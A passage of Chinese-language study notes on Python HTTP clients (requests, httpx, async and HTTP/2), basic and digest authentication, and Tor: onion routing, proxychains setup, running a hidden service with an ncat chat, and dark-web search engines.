response = requests.get('http://www.python.org')
```
requests.get()將會回傳一個response物件。  

response物件的內容:  
```
response.status_code:回應HTTP狀態碼

response.content:回應內容

response.json():針對回應內容為json進行接收，如果回應內容不是json則會報錯。
```
### requests GET範例
items()方法可以在迴圈下以key:value方式檢索我們的http header。  
```python
import requests, json


domain = input("Enter the hostname http://")

response = requests.get("http://"+domain)

print(response.json)

print("Status code: "+str(response.status_code))

print("Headers response: ")
for header, value in response.headers.items():
  print(header, '-->', value)
  
print("Headers request : ")
for header, value in response.request.headers.items():
  print(header, '-->', value)
```
我們以python.org當作我們的範例  
以下是程式執行結果:
```
Enter the hostname http://python.org
<bound method Response.json of <Response [200]>>
Status code: 200
Headers response: 
Connection --> keep-alive
Content-Length --> 50762
Server --> nginx
Content-Type --> text/html; charset=utf-8
X-Frame-Options --> DENY
Via --> 1.1 vegur, 1.1 varnish, 1.1 varnish
Accept-Ranges --> bytes
Date --> Thu, 10 Jun 2021 10:36:12 GMT
Age --> 118
X-Served-By --> cache-bwi5138-BWI, cache-hkg17924-HKG
X-Cache --> HIT, HIT
X-Cache-Hits --> 2, 292
X-Timer --> S1623321373.675345,VS0,VE0
Vary --> Cookie
Strict-Transport-Security --> max-age=63072000; includeSubDomains
Headers request : 
User-Agent --> python-requests/2.25.1
Accept-Encoding --> gzip, deflate
Accept --> */*
Connection --> keep-alive
```
另一段範例  
keys()方法可以只取得key。  
response.headers[]也可以用類似list的方式取值。  
```python
import requests

if __name__ == "__main__":
    domain = input("Enter the hostname http://")
    response = requests.get("http://"+domain)
    for header in response.headers.keys():
        print(header  + ":" + response.headers[header])
```
(p.140)

### requests 取得網頁連結與圖片連結
簡易的圖片連結檢索器
```python
import requests
import re #正規表達式

url = input("Enter URL > ")
var = requests.get(url).text #取得網頁內文HTML

print("Images:")
print("#########################")
for image in re.findall("<img (.*)>",var): #從網頁內文中找到所有<img ...某些內容... >的字段
    for images in image.split(): #分割空格與換行
        if re.findall("src=(.*)",images): #從網頁內文中找到所有src=...某些內容... 的字段
            image = images[:-1].replace("src=\"","") #從第一個到最後一個元素(-1)清除src="
            if(image.startswith("http")):
                print(image)
            else:
                print(url+image)

print("#########################")
print("Links:")
print("#########################")
for link,name in re.findall("<a (.*)>(.*)</a>",var):
    for a in link.split():
        if re.findall("href=(.*)",a):
            url_image = a[0:-1].replace("href=\"","")
            if(url_image.startswith("http")):
                print(url_image)
            else:
                print(url+url_image)
```
(p142)

### 實做GET請求，並且測試RESTful API
可以用來測試http請求的網站  
https://httpbin.org/  
```python
import requests, json

response = requests.get("http://httpbin.org/get",timeout=5)

#狀態碼
print("\n------------------------")
print("HTTP Status Code: " + str(response.status_code))

#回應header，json字串型態
print("\n-------------response.header-------------")
print(response.headers) #顯示header

#如果請求成功
if response.status_code == 200:

    #json轉dictionary的結果
	print("\n-------------response.json-------------")
	results = response.json()
	print(type(results))
	for result in results.items():
		print(result)

    #requests的header回應檢索
	print("\n------------------------")
	print("Headers response: ")
	for header, value in response.headers.items():
		print(header, '-->', value)

	#requests的header請求檢索
	print("\n------------------------")
	print("Headers request : ")
	for header, value in response.request.headers.items():
		print(header, '-->', value)

	#從response.headers裡頭找尋header參數
	print("\n------------------------")
	print("Server:" + response.headers['server'])
else:
	print("Error code %s" % response.status_code)
```
get的回應節錄
```
------------------------
HTTP Status Code: 200

-------------response.header-------------
{'Date': 'Fri, 11 Jun 2021 04:25:18 GMT', 'Content-Type': 'application/json', 'Content-Length': '305', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}

-------------response.json-------------
<class 'dict'>
('args', {})
('headers', {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate', 'Host': 'httpbin.org', 'User-Agent': 'python-requests/2.25.1', 'X-Amzn-Trace-Id': 'Root=1-60c2e5ae-5bd0a2b0562221f66a87d7ca'})
('origin', '1.200.88.137')
('url', 'http://httpbin.org/get')
```
### 實做POST請求，並且測試RESTful API
post請求可以在request body裡頭加入參數。  
例如用來傳送帳號密碼申請表單的電子郵件，名稱...等。  
```python
#!/usr/bin/env python3

import requests,json
data_dictionary = {"id": "0123456789"}
headers = {"Content-Type" : "application/json","Accept":"application/json"}
response = requests.post("http://httpbin.org/post",data=data_dictionary,headers=headers,json=data_dictionary)

#可以選用JSON式的請求傳送，或是普通的data式，通常結果都一樣，也可依照API特殊需求挑整。

#JSON式的請求
#response = requests.post("http://httpbin.org/post",headers=headers,json=data_dictionary)

#普通非JSON式的請求
#response = requests.post("http://httpbin.org/post",headers=headers,data=data_dictionary)

#狀態碼
print("\nHTTP Status Code: " + str(response.status_code))

#回應header
print("\n----------response.headers----------")
print(response.headers)

if response.status_code == 200:

	results = response.json()
	for result in results.items():
		print(result)

	print("\n----------Headers response by items()----------")
	print("Headers response: ")
	for header, value in response.headers.items():
		print(header, '-->', value)

	print("\n----------Headers request by items()----------")
	print("Headers request : ")
	for header, value in response.request.headers.items():
		print(header, '-->', value)

	print("Server:" + response.headers['server'])
else:
	print("Error code %s" % response.status_code)
```
回應的節錄
```
HTTP Status Code: 200

----------response.headers----------
{'Date': 'Fri, 11 Jun 2021 04:17:08 GMT', 'Content-Type': 'application/json', 'Content-Length': '465', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
('args', {})
('data', 'id=0123456789')
('files', {})
('form', {})
('headers', {'Accept': 'application/json', 'Accept-Encoding': 'gzip, deflate', 'Content-Length': '13', 'Content-Type': 'application/json', 'Host': 'httpbin.org', 'User-Agent': 'python-requests/2.25.1', 'X-Amzn-Trace-Id': 'Root=1-60c2e3c4-2fe5016960638a1034d080a5'})
('json', None)
('origin', '1.200.88.137')
('url', 'http://httpbin.org/post')
```
(p.147)  
### requests中的proxy參數
proxy是代理伺服器，有的代理伺服器有辦法掩蔽主機的IP  
requests中預設了代理伺服器的選項  
```python
import requests

#建立一個dictonary，裡面包含代理伺服器的資訊
proxy = {"代理伺服器支援的協定":"ip與port"}

#發送get請求
requests.get("要發送請求的網址", proxies=proxy_dictionary)
```

### requests中的錯誤管理
我們可以用回應碼來確認錯誤類型  
```python
response = requests.get('http://www.google.com/pagenotexists')
print(response.status_code) #404
```
也可以蓄意呼叫錯誤訊息
```python
response.raise_for_status()
```
詳細的錯誤訊息也會存在物件中
```python
>>>response = requests.get('http://url_not_exists')
>>>requests.exceptions.ConnectionError

HTTPConnectionPool(host='url_not_exists', port=80): Max retries
exceeded with url: / (Caused by NewConnectionError('<urllib3.
connection.HTTPConnection object at 0x7f0a58525780>: Failed
to establish a new connection: [Errno -2] Name or service not
known',))
```

<a href="#menu-location">跳到目錄</a>  

<span id="httpx"></span>
### httpx的HTTP客戶端與異步編程
(p.149)  
httpx模塊非常推薦用來管理異步http請求。  
支援HTTP1.1，相容於HTTP2，而且效能上有所提昇，也支援例如HTTP2 header的壓縮。  
HTTP1.1與HTTP2最主要的差別在於，HTTP1.1是以文本文主的傳輸，HTTP2是以二進制的方式傳輸。  

HTTP2是HTTP協定的大版本，提供更有效率的傳輸方式。  
HTTP2並沒有對於request,response語意產生很的更改，只是更改了將內容傳向伺服器的方式。  

安裝httpx
```python
apt pip3 install httpx
```

### httpx簡單基礎的傳輸
```python
import httpx

client = httpx.Client(timeout=10.0)
response = client.get("http://www.google.es")
print(response)
print(response.status_code)
print(response.text)
```

### httpx異步請求

對於異步傳輸的程式需求，可以採取asyncio模塊，讓我們可以同步發送大量http請求，不用等待上一個請求得到回應後，才發送下一個。  

```python
import httpx
import asyncio

async def request_http1():
    async with httpx.AsyncClient() as client:
        response = await client.get("http://www.google.es")
        print(response)
        print(response.text)
        print(response.http_version)
		
asyncio.run(request_http1())
```
### httpx異步請求速度比較
異步請求
```python
import httpx
import asyncio
import time

async def request_http1():
	start=time.time()
	async with httpx.AsyncClient() as client:
		for i in range(50):
			response = await client.get("http://www.google.es")
	print(time.time()-start)

asyncio.run(request_http1())
```
非異步請求
```python
import httpx
import time

start=time.time()

for i in range(50):
	client = httpx.Client(timeout=10.0)
	response = client.get("http://www.google.es")

print(time.time()-start)
```
非異步請求一定要等到上個請求有所回應，才會開始下個請求。  
異步請求則是會同時發出請求，然後分別等待回應。  

執行後的時間比較:
```
異步請求
5.62秒

非異步請求
7.4秒
```
我們可以看出，異步請求快了一些。
### httpx與HTTP2.0
(P.150)  
HTTP2並不是預設開啟的，因為HTTP1.1更加的成熟。  
以下是啟用HTTP2的範例

要讓httpx模塊執行HTTP2要先安裝插件:
```
pip3 install httpx[http2]
```
以下是範例
```python
import httpx
import asyncio

async def resquest_http2():
	async with httpx.AsyncClient(http2=True) as client:
		response = await client.get("https://www.google.es")
		print(response)
		print(response.http_version)
		
asyncio.run(resquest_http2())
```
### httpx與Trio異步執行
我們也可以用Trio模塊異步執行HTTP請求，用來替換asyncio，來同時發出許多的HTTP請求。  
據說，Trio使用上十分友善。  
```python
import httpx
import trio

results={}

async def fetch_result(client,url,results):
    print(url)
    results[url] = await client.get(url)
	
async def main_parallel_requests():
	async with httpx.AsyncClient(http2=True) as client:
		async with trio.open_nursery() as nursey:
			for i in range(2000,2020):
				url = f"https://en.wikipedia.org/wiki/{i}"
				nursey.start_soon(fetch_result,client,url,results)
		
trio.run(main_parallel_requests)
print(results)
```
open_nursery()函數可以用於同時運行多個I/O函數。  
而在await函數被觸發時，程式會將控制權交給正在同時進行的其他函數，所以如果有十個函數await每個函數內容為等待一秒，則總共仍然只等待一秒左右。  

<span id="httpauthentication"></span>
## HTTP認證機制(authentication)
(p.152)
HTTP其實預先提供了三種認證機制，來對合法用戶進行驗證。  

```
HTTP basic authentication:
base64編碼user:password的使用者認證資訊。

HTTP digest authentication:
將用戶的user,key,realm hashes轉換成MD5 hash，無法反推回明文，但可驗證是否正確。  

HTTP bearer authentication:
用access_token來認證用戶，最受歡迎的一種認證方式為OAuth。
```
以下網頁有介紹，有幾個python的函數庫可以實做OAuth。  
https://oauth.net/code/python/  

requests模塊支援HTTP basic authentication與HTTP digest authentication，兩種認證方式。但僅用base64編碼用戶資訊顯然是相對不安全的，所以推薦用MD5雜湊來認證訊息。  

### 用requests實做HTTP basic authentication
(p.152)
它的好處是很容易在Apache Web server上頭實現的，透過Apache指令與httpasswd工具。  
此種方法的爭議在於非常容易從base64編碼中提取憑證(或使用者獨特的其他識別編號)，像是透過Wireshark 嗅探工具，因為整個傳送過程都是清楚未加密文本的，對攻擊者而言是完全沒有阻礙的。

所有使用者資訊放在Authorization header被進行傳送。

Basic-access authentication假定使用者是用名稱與密碼識別的，當瀏覽器用戶第一次用authentication存取一個網站時，伺服器會回應401代碼，內容包含著containing the WWW-Authenticate tag，basic的值與網址，也就是內含關於認證訊息的內容。Basic認證的訊息與被保護網站的網址。  

(p.153文章中間段)

```python
import requests
from requests.auth import HTTPBasicAuth
from getpass import getpass

username=input("Enter username:")
password = getpass()

response = requests.get('https://httpbin.org/basic-auth/user/pass', auth=HTTPBasicAuth(username,password))

print("\n------------Headers request------------\n")
for header, value in response.request.headers.items():
  print(header, '-->', value)
print("\nplain text:\n",response.request.headers)

print('\n------------Response.status_code------------\n'+ str(response.status_code))

if response.status_code == 200:
    print('Login successful :'+response.text)
    print("\n------------Headers response------------\n")
    for header, value in response.headers.items():
        print(header, '-->', value)
```
可以輸入帳號與密碼試試
```
帳號:user
密碼:pass
```
結果
```
Enter username:user
Password: 

------------Headers request------------

User-Agent --> python-requests/2.25.1
Accept-Encoding --> gzip, deflate
Accept --> */*
Connection --> keep-alive
Authorization --> Basic dXNlcjpwYXNz

plain text:
 {'User-Agent': 'python-requests/2.25.1', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'Basic dXNlcjpwYXNz'}

------------Response.status_code------------
200
Login successful :{
  "authenticated": true, 
  "user": "user"
}


------------Headers response------------

Date --> Sat, 12 Jun 2021 08:58:14 GMT
Content-Type --> application/json
Content-Length --> 47
Connection --> keep-alive
Server --> gunicorn/19.9.0
Access-Control-Allow-Origin --> *
Access-Control-Allow-Credentials --> true
```
我們注意這一段
```
Authorization --> Basic dXNlcjpwYXNz
```
dXNlcjpwYXNz 經過base64解碼之後的結果為
```
user:pass
```
所以不太安全，只要這一串請求被攔截，那密碼隨機暴露。
### 用requests實做HTTP digest authentication
HTTP digest authentication可以將用戶的使用者資訊,key,網址...等等的，用MD5雜湊來加以驗證，並且可以用SHA加密來提高安全性。  

並且MD5也可以賦予每個用戶一個獨一無二的數值，儲存在瀏覽器中的數值是密碼進行計算之後的Hash。  

儘管如此，登入的使用者名稱還是明文的傳向伺服器。  

我們可以使用HTTPDigestAuth()函數，屬於requests.auth子模塊。  

以下為digest authentication範例
```python
#使用者 user 密碼pass
import requests
from requests.auth import HTTPDigestAuth
from getpass import getpass

user=input("Enter user:")
password = getpass() #其實跟一般的input差不多，只是不會顯示出內容，就跟Unix上頭輸入密碼一樣

url = 'http://httpbin.org/digest-auth/auth/user/pass'
response = requests.get(url, auth=HTTPDigestAuth(user, password))

print("\n------------Headers request------------\n")
for header, value in response.request.headers.items():
  print(header, '-->', value)
print("\nplain text:\n",response.request.headers)

print('\n------------Response.status_code------------\n'+ str(response.status_code))
if response.status_code == 200:
    print('Login successful :'+str(response.json()))
    print("\n------------Headers response------------\n")
    for header, value in response.headers.items():
        print(header, '-->', value)
```
帳號與密碼如下
```
帳號:user
密碼:pass
```
結果為:
```
Enter user:user
Password: 

------------Headers request------------

User-Agent --> python-requests/2.25.1
Accept-Encoding --> gzip, deflate
Accept --> */*
Connection --> keep-alive
Cookie --> stale_after=never; fake=fake_value
Authorization --> Digest username="user", realm="me@kennethreitz.com",
nonce="8aee622b5cbcc09f3259ab93e015d43f", uri="/digest-auth/auth/user/pass",
response="dafaf0489982d50fdb3f0fd910d2791f", opaque="f09b7afd8ca63aafce5bf07019d8e571",
algorithm="MD5", qop="auth", nc=00000001, cnonce="00d5df89a2411b58"

plain text:
 {'User-Agent': 'python-requests/2.25.1', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Cookie': 'stale_after=never; fake=fake_value', 'Authorization': 'Digest username="user", realm="me@kennethreitz.com", nonce="8aee622b5cbcc09f3259ab93e015d43f", uri="/digest-auth/auth/user/pass", response="dafaf0489982d50fdb3f0fd910d2791f", opaque="f09b7afd8ca63aafce5bf07019d8e571", algorithm="MD5", qop="auth", nc=00000001, cnonce="00d5df89a2411b58"'}

------------Response.status_code------------
200
Login successful :{'authenticated': True, 'user': 'user'}

------------Headers response------------

Date --> Sat, 12 Jun 2021 09:04:28 GMT
Content-Type --> application/json
Content-Length --> 47
Connection --> keep-alive
Server --> gunicorn/19.9.0
Set-Cookie --> fake=fake_value; Path=/, stale_after=never; Path=/
Access-Control-Allow-Origin --> *
Access-Control-Allow-Credentials --> true

```
我們來關注最重要的部份
```
Authorization --> 

#	使用者名稱
Digest username="user",

#	一般是用戶的網站，但此處是requests的模塊開發者留下的
realm="me@kennethreitz.com",

#	伺服器生成的隨機數值
nonce="8aee622b5cbcc09f3259ab93e015d43f",

#	要存取的唯一資源位置，可以當成沒有domain name的URL
uri="/digest-auth/auth/user/pass",

#	response產生方式為
#	HA1 = MD5(username:realm:password)
#	HA2 = MD5(method:digestURI)
#	response = MD5(HA1:nonce:HA2)
response="dafaf0489982d50fdb3f0fd910d2791f",

#	RFC2069定義:opaque為一串數據，由伺服器指定，客戶端原樣返回。	
opaque="f09b7afd8ca63aafce5bf07019d8e571",

#	雜湊演算法為MD5
algorithm="MD5",

#	quality of protection，後來才加入的，用於增加安全性措施
qop="auth", nc=00000001,

#	客戶端生成的cnonce
cnonce="00d5df89a2411b58"
```
強烈建議看下digest authentication的Wiki:  
https://en.wikipedia.org/wiki/Digest_access_authentication  
關於nonce可以參見:  
https://zh.wikipedia.org/wiki/Nonce  
  
(p.156)

<a href="#menu-location">跳到目錄</a>  

<span id="tor&hidden_device_dicover"></span>
## 連接到TOR網路與發現隱藏的設備  
(p.159)  
簡單來說，tor可以藉由onion routing這種路由方式，讓你的要瀏覽網站的請求封包，加密轉送到別的主機上，最後在某一台主機解密，並且請求網站。請由的網站，將網站內容返回最後一台主機後，加密並且沿著剛剛的傳送路徑一路送回到你的電腦後解密。  

### onion routing(洋蔥路由)
它會在多個router(洋蔥網路的節點)進行加密，而每一個router都只知道它該層發生的事情，所以無法確切得知你的完整瀏覽訊息。  

1. 用戶端下載可用的tor relay(洋蔥中繼)清單，並且從中挑選三個節點。一個guard node，一個middle or relay node還有一個exit node。  

2. 當你瀏覽網站時，一開始就會進行加密，以致只有exit node節點知道你瀏覽的網站網址，但通常情況下數據包的內容是難以被正確得知的。  

3. 由於封包已經被加密，所以只有middle or relay node知道封包要被送網哪個exit node。    

(p.162)  
guard node只能看見你交換著被加密訊息，guard node之知道你的IP與middle node的IP。  
middle node只知道guard node與exit node的IP，但不清楚你瀏覽的網站IP與內容。  
exit node只知道middle node的IP與瀏覽的網站，但不知道guard node與你的IP。  

官方圖文說明:  
https://2019.www.torproject.org/about/overview.html.en.  

更仔細的來看可以分成六個步驟:

1. 向中央伺服器取得可用中繼目錄列表。  

2. 客戶端會隨機透過加密連結，連向其中一個中繼節點，這個節點又會隨機連向另外一個節點。持續到訊息到達目標伺服器(例如網站伺服器)。到達出口節點時進行解密，並且連向目標伺服器。  

3. 使用非對稱加密，首先資料會被最後一個節點收到的公鑰加密(我猜是由伺服器傳出)，只有目標伺服器可以解密。並且隨著每一次轉送都會加密一次，只有倒數第二個節點可以解開先前進行的其餘加密。  

4. 我們來觀察加密的資料結構，客戶端(第一台)電腦會用最後一台電腦的公鑰進行加密，並且也只有客戶端(第一台)電腦可以解密，除此之外封包也被往最後一個節點的方向加密，總之到達最後一個節點時才有辦法完成解密。  

5. 為了防止第三方分析我們的傳輸，每十分鐘會重新選擇新的節點。  

6. Tor的節點是公開的，所以如果我們自己就是節點，我們會提高自身的隱私程度，儘管這聽起來矛盾，但如果我們自身也是節點，流量在我們身上通行，那監控者更難分辨我們目前的流量與封包，特別是當幾百個用戶通過我們傳輸時。  

### 什麼是隱藏服務(Hidden Service)

Tor服務允許伺服器對於使用者隱藏IP，這樣的網站稱為Onion service或Hidden service。  

Hidden service只能由Tor網路進行瀏覽，因為這樣的網站就在tor network之中，許多非法網站藏匿其中。  

但這些服務犧牲了效能，效能消耗在用戶與伺服器建立連接的過程中，所以Hidden service通常回應速度很慢。  

也就是為了安全起見，伺服器服務與用戶之間通過了六個節點。  

因此Hidden service常常只有簡單的網頁，並且非常的緩慢。  

(p.165)

### 使用工具連上Tor網路

我們普遍上使用Tor瀏覽器連上tor網路，算是修改版本的Firefox，但增加了某些插件Torbutton, NoScript與HTTPS Everywhere。允許你高度安全瀏覽網頁，藉由關閉session。紀錄機密使用者資料的cookie會被關閉。  

用通常的方式運作Tor瀏覽器:  

1. 從以下網站下載Tor瀏覽器
	https://www.torproject.org  

2. 點開start-tor-browser  

Debian-based 的linux，例如Ubuntu或Linux Mint可以用apt來下載:

```
sudo apt install torbrowser-launcher
```
運作
```
torbrowser-launcher
```
(P.166)  

順帶一提，左上角有個按鈕可以切換不同的IP，來瀏覽網站。  

### Tor社群正在開發的不同計畫
Tor社群正在開發的不同計畫可以在以下網站看見:  
https://2019.www.torproject.org/projects/projects

以下舉兩個受歡迎的計畫:  
Tails:可以裝在隨身碟的作業系統，強調安全，強迫使用Tor網路，使用上基本是無痕的(整個作業系統載入RAM，關電源就會遺失資料。)  
Orbot:官方安卓App。  

### Tor中的節點類型
(p.167)  
所有的節點都是世界各處的人們貢獻的，我們可以透過以下網站看到相關資訊。  

Tor Map
https://tormap.void.gr  

節點分為以下幾種

1. Entry nodes (guard relays):入口節點，有著慷慨的頻寬，用於讓使用者連入tor。
並且長時間使用。

2. Middle nodes (middle relays):中間節點，不會對外連出tor網路，設置起來最輕鬆快速安全。  

3. Output nodes (exit relays):取得使用者的request，並且傳向收信方，並且接收回應，送回一開始的請求者。
通常由機構或是其它參與tor行動者。並且有能力面對tor用戶從此處發出的request後的法律後果。  

4. Bridge nodes (bridge relays):並沒有列入Tor的節點目錄中，所以意味著更加的不容易被封鎖。當我們的網路供應商(ISP)封鎖了Tor網路時，我們只能用這種方式連上。普通的節點被列在tor公開的清單上，但是Bridge node不會被列在其中。  

取得橋接隨機節點:  
https://bridges.torproject.org  

(p.167)

<span id="tor_service"></span>
### 讓普通連網通過Tor
這個操作我們會進行在Ubuntu或Debian一類的作業系統上頭。  
啟動之後可以讓我們使用普通網路時藉由Tor瀏覽。  

安裝文字編輯器nano：
```
sudo apt install nano
```
安裝tor服務:
```
sudo apt install tor
```
安裝proxy(代理伺服器)的連接軟體proxychains:
```
sudo apt install proxychains
```
打開proxychains連線設定:
```
nano /etc/proxychains.conf 
```
將下列選項dynamic_chain取消註解(把前頭的#號刪除即可)
```
# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#       

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
dynamic_chain
```
把strict_chain前頭加上#號，進行註解。
```
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
#strict_chain
```
由於tor服務會監聽9050 port，所以要在這個設定檔的最後，加上這個ip:127.0.0.1:9050
```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050
```
然後啟動tor服務
```
 service tor start
```
接下來藉由proxychains軟體啟動瀏覽器，來看看網站上的IP是否不再是我們原本的IP了。
```
proxychains firefox www.ipchicken.com
```
(p.168)
如果要修改tor設定，可以去/etc/tor/torrc進行調整，例如下列範例把tor的偵聽port開在9051
```
## Tor opens a socks proxy on port 9050 by default -- even if you don't
## configure one below. Set "SocksPort 0" if you plan to run Tor only
## as a relay, and not make any local application connections yourself.
#SocksPort 9050 # Default: Bind to localhost:9050 for local connections.
#SocksPort 192.168.0.1:9100 # Bind to this address:port too.
SocksPort 9052
```
更多tor網路設定教學:  
https://support.torproject.org/tbb/tbb-47/  

慣例上來看，tor最主要用到兩個port：  

1. port 9050:用來等待用戶連結，並且進入tor網路。  
2. port 9051:允許對於tor服務程序進行操作與調整。  

我們可以直接執行下列指令，來同時擁有9050,9051兩個port的功能:
```
tor --SocksPort 9050 --ControlPort 9051
```
直接手動啟動tor與啟動tor service的差異在於，tor service是背景運作的，並且可以開機自動啟動。  
我們來解析tor的啟動流程訊息  

```
啟動tor用9050接收連結，9051進行控制
root@alex:/#  tor --SocksPort 9050 --ControlPort 9051

說明使用的套件版本
Jun 15 06:34:58.351 [notice] Tor 0.4.2.7 running on Linux with Libevent 2.1.11-stable, OpenSSL 1.1.1f, Zlib 1.2.11, Liblzma 5.2.4, and Libzstd 1.4.4.

如果錯誤的使用，官方是免責的
Jun 15 06:34:58.351 [notice] Tor can't help you if you use it wrong! Learn how to be safe at https://www.torproject.org/download/download#warning

讀取設定檔，我們剛剛修改的檔案
Jun 15 06:34:58.351 [notice] Read configuration file "/etc/tor/torrc".

由於本篇是在docker容器裡頭運作，所以會跳出權限不受保護的警告
Jun 15 06:34:58.352 [warn] ControlPort is open, but no authentication method has been configured.  This means that any program on your computer can reconfigure your Tor.  That's bad!  You should upgrade your Tor controller as soon as possible.

開啟9050port
Jun 15 06:34:58.352 [notice] Opening Socks listener on 127.0.0.1:9050
Jun 15 06:34:58.352 [notice] Opened Socks listener on 127.0.0.1:9050

開啟9051port
Jun 15 06:34:58.352 [notice] Opening Control listener on 127.0.0.1:9051
Jun 15 06:34:58.352 [notice] Opened Control listener on 127.0.0.1:9051


解析IP地域檔案，應該是說明IP與地理位置的關係檔案。
Jun 15 06:34:58.000 [notice] Parsing GEOIP IPv4 file /usr/share/tor/geoip.
Jun 15 06:34:58.000 [notice] Parsing GEOIP IPv6 file /usr/share/tor/geoip6.

警告不該使用root運作tor，但由於是在容器裡頭，我們就先別注意如此多，正常情況別這樣就好了
Jun 15 06:34:58.000 [warn] You are running Tor as root. You don't need to, and you probably shouldn't.

啟動
Jun 15 06:34:58.000 [notice] Bootstrapped 0% (starting): Starting
Jun 15 06:34:58.000 [notice] Starting with guard context "default"

連接到提供節點目錄的中繼節點
Jun 15 06:34:59.000 [notice] Bootstrapped 5% (conn): Connecting to a relay
Jun 15 06:35:00.000 [notice] Bootstrapped 10% (conn_done): Connected to a relay

與提供節點目錄的中繼節點三向交握
Jun 15 06:35:00.000 [notice] Bootstrapped 14% (handshake): Handshaking with a relay
Jun 15 06:35:01.000 [notice] Bootstrapped 15% (handshake_done): Handshake with a relay done

載入可以使用的節點目錄，也就是我們會取得幾個節點IP，然後取其中三個組成一個通信鍊路
Jun 15 06:35:01.000 [notice] Bootstrapped 75% (enough_dirinfo): Loaded enough directory info to build circuits

結束與提供節點目錄的中繼節點通信
Jun 15 06:35:01.000 [notice] Bootstrapped 90% (ap_handshake_done): Handshake finished with a relay to build circuits

建立鍊路
Jun 15 06:35:01.000 [notice] Bootstrapped 95% (circuit_create): Establishing a Tor circuit

完成
Jun 15 06:35:03.000 [notice] Bootstrapped 100% (done): Done
```
對了，啟動tor服務之後，我們可以用下列兩條指令進行檢查，確認tor是否好好監聽5090與5091port  
```bash
 sudo netstat -plnt | fgrep 9050
 sudo netstat -plnt | fgrep 9051
```
(p.171)
### 查詢某個IP是否為Tor中繼節點

ExoneraTor服務:是個可以查詢某個IP位址是否是tor節點的服務，它提供一個網站，裡頭輸入IP就可以查詢該IP是否為tor節點。  

ExoneraTor  
https://metrics.torproject.org/exonerator.html  

### Nyx面板

Nyx軟體可以讓你直接觀察一個節點的頻寬，log與其它細節。

Nyx網站  
https://nyx.torproject.org  

ubuntu安裝  
```
sudo apt-get install nyx
```

由於Nyx必須連上Tor網路的控制port，所以要建立控制port 9051。
```
tor --SocksPort 9050 --ControlPort 9051
```
然後啟動Nyx
```
Nyx
```
控制面板靠鍵盤上的左與右來進行切換。  
第一頁是目前流量與頻寬，第二頁是你所擁有的數個節點IP位址，OUTBOUND是你連出去的第一個入口節點的IP。  
後面幾頁是關於設定，可以自己建立hidden service與設置控制port,連接port等等。  

<span id="build_hidden_service"></span>
### 建立Hidden service與利用暗網通話
1. 首先關閉所有tor service

2.	對配置檔進行修改，配置檔的名稱為torrc，位置為/etc/tor/torrc。
	```
	nano /etc/tor/torrc 
	```

3.	修改內容為添加以下內容，第一行的意義是
	```
	HiddenServiceDir /var/lib/tor/hidden_service/
	HiddenServicePort 8081 127.0.0.1:8080
	```
	第一行的意義是，將HiddenService的網址一類的文件與配置檔放到/var/lib/tor/hidden_service/資料夾。  
	第二行的意義是，將從外部網路，也就是穿越暗網的客戶抵達8081port的訊息，轉送到本機的IP 127.0.0.1:8080，也就是我們只要偵聽127.0.0.1:8080，就能聽到來穿越暗網的連結訊息。

4.	啟動tor
	```
	tor --SocksPort 9050 --ControlPort 9051
	```
	先記住，只要把我們的請求傳入127.0.0.1:9050 port，就能夠通過tor網路通訊了。  
5.	來看看我們的暗網網址是什麼？
	```
	cat /var/lib/tor/hidden_service/hostname 
	```
	看起來網址是
	```
	r55kblf7bkgfhcxitemggrx5wwwoey6ljnvdclk2v6mqbd2kyp7bllyd.onion
	```

6.	為了聊天，我們要安裝聊軟體ncat(???!!!)  

	經過實測，netcat通訊時有時後會產生用戶端收不到內容的情況，而在這個方面新的ncat實測是不會有此問題的。
	```
	apt install ncat
	```

7.	netcat開啟我們的聊天室
	```
	ncat -vl 127.0.0.1 8080
	```
	因為從暗網而來的訊息會傳達到127.0.0.1:8080，所以我們只要聽著就好。  

8.	想要連入我們的聊天室的朋友只要遵循以下步驟即可
	安裝tor
	```
	apt install tor
	```
	啟動tor
	```
	tor --SocksPort 9050 --ControlPort 9051 &
	```
	安裝netcat
	```
	apt install netcat
	```
	啟動netcat連上我們的聊天伺服器
	```
	netcat -v -x 127.0.0.1:9050 	r55kblf7bkgfhcxitemggrx5wwwoey6ljnvdclk2v6mqbd2kyp7bllyd.onion(你的暗網網址) 8081
	```
	netcat -v 代表查看詳細資料，-x代表通過代理伺服器，而我們的代理伺服器就是我們的tor，而我們自己的tor的位置是127.0.0.1:9050。最後在接上我們暗網的網址，與該網址對外偵聽的port。  

完成！！！

<span id="discover_hidden_service"></span>
### 如何發現Hidden service!?
(p.173)  
我們如何從一片交錯的道路中發覺暗網的服務呢？  
本章節就是來探討這件事情，我們可以藉此學習Open Source Intelligence (OSINT)(開放資源蒐集)的一些能力。  

### 找到暗網網站的方法

在此先說明，由於暗網的網址常常變動，所以不建議單單把一條暗網網址進行保存，因為可能很快就過期。建議從一般網路的暗網搜尋引擎來發覺暗網的網站。  

Hidden Wiki:  
是個受歡迎找到隱藏的網站的地方，可以視為一個入口網站或教學網站。  
但上頭的網址大多過期  
https://thehiddenwiki.org  
https://hiddenwiki.com/  

Torch:  
一個搜尋引擎，但是建議從一般網路進入  
https://www.torsearch.org/  

Ahmia:  
也是個搜尋引擎，傳說Ahmia可以搜尋的數量少於DarkSearch。  
https://ahmia.fi/  

DarkSearch:  
非常有研究價值的搜尋引擎，因為提供了免費的API供程式自動搜索，可以嘗試用爬蟲尋找資訊。  
https://darksearch.io/  

<span id="check_onion_url">大量檢查暗網網址的有效性</span>
### 檢查暗網網址是否有效

我們可以用以下的程式來檢查網誌是否有效  
https://github.com/k4m4/onioff  

但由於該程式裡頭檢查tor是否啟用成功的API網址已經失效，所以我們等下要略做修改。  

在這之前我們先進行下載，與安裝相依模塊。  
```
